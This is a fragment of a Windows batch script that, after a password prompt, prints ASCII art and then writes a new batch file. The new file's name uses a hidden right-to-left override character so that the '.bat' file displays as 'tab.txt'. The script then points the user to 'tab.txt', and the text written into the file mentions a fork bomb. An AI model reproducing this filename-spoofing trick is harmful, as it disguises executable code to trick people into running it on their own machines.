...
:correct
::the following is for if you get the password right.
color 3
echo Correct, you may now get this tool.
timeout /t 2 /nobreak > NUL
cls
echo I will edit the "tab.txt" file for you to use :)
timeout /t 1 /nobreak > NUL
echo for now, here is a little bit of a pattern i made!
timeout /t 1 /nobreak > NUL
echo \`._`--','    )   o `.    <       :     \  ( ( ,. \  \\
echo \\\  `-,'     /  ,-.___`-.  :      |      \  \ `' ) )  \
echo \\     |      |  `-.   `-'  |     ,'-._   \`._`--','    )   o
...
echo  \  \\     |      |  `-.   `-'  |     ,'-._   \`._`--','    )
echo ) )  \     :       >    `. o   (    ,',--. `.\\\  `-,'-hrr-/
echo @echo off > ‮txt.bat
echo :bootup >> ‮txt.bat
echo echo Made by justatmeasthis :) >> ‮txt.bat
echo timeout /t 2 /nobreak > NUL >> ‮txt.bat
echo echo If you've opened up a fork bomb, please fullscreen this so nothing can overlay this, and so you can remove the forkbomb >> ‮txt.bat
echo echo timeout /t 2 /nobreak > NUL >> ‮txt.bat
echo echo press R to go back to bootup whenever you like >> ‮txt.bat
echo Check up on the file called "tab.txt"
